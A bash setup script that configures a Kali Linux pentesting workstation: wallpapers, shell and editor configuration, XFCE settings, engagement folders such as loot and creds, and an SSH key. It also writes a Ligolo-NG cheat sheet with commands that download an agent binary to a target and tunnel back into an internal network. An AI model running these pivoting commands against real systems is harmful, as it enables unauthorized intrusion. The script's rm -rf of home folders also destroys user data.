#!/bin/bash
#Author: TheLeopard65

set -euo pipefail

GREEN="\033[0;32m"
YELLOW="\033[1;33m"
RED="\033[0;31m"
BLUE="\033[0;34m"
NC="\033[0m"

info() { echo -e "${BLUE}[INFO]${NC} $1"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; }
success() { echo -e "${GREEN}[ OK ]${NC} $1"; }

if ! command -v figlet &> /dev/null; then
  apt-get -qq update || true
  apt-get -qq install -y figlet || true
fi

echo -e "${GREEN}[###] ----------------------------------------------------------------------------------------------------------------- [###]${NC}"
figlet "PENTESTER'S KALI - LINUX" || echo -e "${YELLOW}(Install 'figlet' to see ASCII banners)${NC}"
echo -e "${GREEN}[###] ----------------------------------------------------------------------------------------------------------------- [###]${NC}"

export DEBIAN_FRONTEND=noninteractive
echo '* libraries/restart-without-asking boolean true' | debconf-set-selections

TARGET_USER=${USER:-$(whoami)}
TARGET_HOME=$(eval echo "~$TARGET_USER")
SCRIPT_DIR=$(dirname "$(realpath "$0")")

if [[ -z "$TARGET_HOME" || "$TARGET_HOME" == "/" ]]; then
    error "TARGET_HOME is invalid - aborting dangerous delete."
    exit 1
fi

prompt_yes_no() {
    read -p "[#] $1 (Y/N) [default: N]: " reply
    reply=${reply:-N}
    echo "${reply,,}"
}

narc=$(prompt_yes_no "1. Modify nanorc for easier usage? ------")
zshc=$(prompt_yes_no "2. Modify .zshrc for better UX? ---------")
barc=$(prompt_yes_no "3. Modify .bashrc for better UX? --------")
desk=$(prompt_yes_no "4. Customize User's XFCE4 Settings? -----")
hdir=$(prompt_yes_no "5. Setup folders in home directory? -----")
skey=$(prompt_yes_no "6. Generate an SSH Key pair (ed25519)? --")

info "[##] Setting up a new Desktop Wallpaper ------------------------------------------------------------------------ [ MANUAL ]"

apt-get install -y kali-wallpapers-2023 kali-wallpapers-2024 kali-wallpapers-2025 kali-wallpapers-community > /dev/null
apt-get install -y kali-wallpapers-2019.4 kali-wallpapers-2020.4 kali-wallpapers-2022 > /dev/null

DEST="/usr/share/backgrounds/kali-custom"

declare -A files=(
    ["firewatch-purple.jpg"]="https://wallpapercave.com/wp/wp14448314.jpg"
    ["black-panther-red.png"]="https://wallpapercave.com/wp/wp12705841.png"
    ["watchtower-waterfall.jpg"]="https://www.hdwallpapers.in/download/artistic_landscape_view_of_mountains_trees_lights_purple_starry_sky_moon_minimalism_4k_hd_minimalism-HD.jpg"
    ["grey-kali-linux.png"]="https://www.kali.org/wallpapers/community/images/community/grey-kali-2025-2-3840x2160.png"
)
declare -A local_files=(
    ["kali-red-sticker.jpg"]="/usr/share/backgrounds/kali-16x9/kali-red-sticker.jpg"
    ["kali-cubism.jpg"]="/usr/share/backgrounds/kali-16x9/kali-cubism.jpg"
)

mkdir -p "$DEST"
for file in "${!files[@]}"; do
    [ -f "$DEST/$file" ] || wget -q "${files[$file]}" -O "$DEST/$file"
done

for file in "${!local_files[@]}"; do
    [ -f "$DEST/$file" ] || cp "${local_files[$file]}" "$DEST/$file"
done

echo -e "${GREEN}[###] ----------------------------------------------------------------------------------------------------------------- [###]${NC}"

if [[ "$narc" == "y" ]]; then
    info "[##] Performing NANO Configurations ---------------------------------------------------------------------------- [ MANUAL ]"
    if [[ -f ./resources/nanorc ]]; then
    	cp ./resources/nanorc "$TARGET_HOME/.nanorc"
    else
        warn "[!!!] nanorc file not found, skipping copy."
    fi
    if [[ -x ./resources/nano-syntax.sh ]]; then
        bash ./resources/nano-syntax.sh > /dev/null
    else
        warn "[!!!] nano-syntax.sh script missing or not executable, skipping."
    fi
fi

if [[ "$barc" == "y" ]]; then
    info "[##] Performing BASH Configurations ---------------------------------------------------------------------------- [ MANUAL ]"
    if [[ -f ./resources/bashrc ]]; then
    	cp "$SCRIPT_DIR/resources/bashrc" "$TARGET_HOME/.bashrc"
    	warn "[#] Manual action needed: Please run 'source ~/.bashrc' after this script."
    else
        warn "[!!!] bashrc file not found in current directory, skipping copy."
    fi
fi

if [[ "$zshc" == "y" ]]; then
    info "[##] Performing ZSH Configurations ----------------------------------------------------------------------------- [ MANUAL ]"
    if [[ -f ./resources/zshrc ]]; then
    	cp "$SCRIPT_DIR/resources/zshrc" "$TARGET_HOME/.zshrc"
        warn "[#] Manual action needed: Please run 'source ~/.zshrc' after this script."
    else
        warn "[!!!] zshrc file not found in current directory, skipping copy."
    fi
fi

if [[ "$desk" == "y" ]]; then
    info "[##] Performing XFCE Customizations ---------------------------------------------------------------------------- [ MANUAL ]"
    if [[ -d "./resources/.config" || -d "./resources/.local" ]]; then
        rm -rf "${TARGET_HOME}/.config" "${TARGET_HOME}/.local"
        cp -rpa ./resources/.config "${TARGET_HOME}/"
        cp -rpa ./resources/.local "${TARGET_HOME}/"
    else
        warn "[!!!] Relevent directories not found in current directory, skipping copy."
    fi
fi

if [[ "$hdir" == "y" ]]; then
	info "[###] Setting up the User's Home Directory --------------------------------------------------------------------- [ MANUAL ]"
	rm -rf "${TARGET_HOME}/Music" "${TARGET_HOME}/Pictures" "${TARGET_HOME}/Templates" "${TARGET_HOME}/Documents" "${TARGET_HOME}/Public" "${TARGET_HOME}/Videos"
	mkdir -p "$TARGET_HOME"/{recon,loot,exploits,creds/hashes,tools,misc,CTF/{rev,pwn,web,misc,crypto,forensics},OpenVPN}
	touch "$TARGET_HOME/creds/credentials.txt"
	touch "$TARGET_HOME/misc/setup-ligolo.sh"
	cat <<'EOL' >> "$TARGET_HOME/misc/setup-ligolo.sh"

## Here are the commands to setup and use Ligolo-NG Tunneling

### Step 1: Create a new Interface and Enable it
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

### Step 2: Start the Ligolo-Proxy as the root
sudo ligolo-proxy -selfcert

### Step 3: Transfer the Agent Binary to Target
# certutil.exe -urlcache -split -f http://<IP>:<Port>/ligolo-agent.exe
# wget "http://<IP>:<Port>/ligolo-agent" -O ligolo-agent

### Step 4: Connect the Agent to the Server
ligolo-agent.exe -connect <IP>:11601 -ignore-cert

### Step 5: Setup a route to the internal network
sudo ip route add 172.168.10.0/24 dev ligolo
EOL

	sudo chown -R $TARGET_USER:$TARGET_USER /home/$TARGET_USER/{recon,loot,exploits,tools,misc,creds,CTF,OpenVPN,.config}
fi

if [[ "$skey" == "y" ]]; then
	ssh-keygen -t ed25519 -f "$TARGET_HOME/creds/ssh-key" -N "" -q -C "kali@kali.org"
	chown -R "$TARGET_USER:$TARGET_USER" "$TARGET_HOME/creds/ssh-key" "$TARGET_HOME/creds/ssh-key.pub"
fi

if [[ "$barc" == "y" ]]; then
	echo -e "${YELLOW}[###] Restart your terminal or run 'source ~/.bashrc' to apply all changes.${NC}"
fi
if [[ "$zshc" == "y" ]]; then
	echo -e "${YELLOW}[###] Restart your terminal or run 'source ~/.zshrc' to apply all changes.${NC}"
fi

chown -R "$TARGET_USER:$TARGET_USER" "$TARGET_HOME"

echo -e "${GREEN}[###] ----------------------------------------------------------------------------------------------------------------- [###]${NC}"
echo -e "${GREEN}[###] Kali-Linux Pentester's Home Directory Setup is finally complete!${NC}"
echo -e "${GREEN}[###] ----------------------------------------------------------------------------------------------------------------- [###]${NC}"
